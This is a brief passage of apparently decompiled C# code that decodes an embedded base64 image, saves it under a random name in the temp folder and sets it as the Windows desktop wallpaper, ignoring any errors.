			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
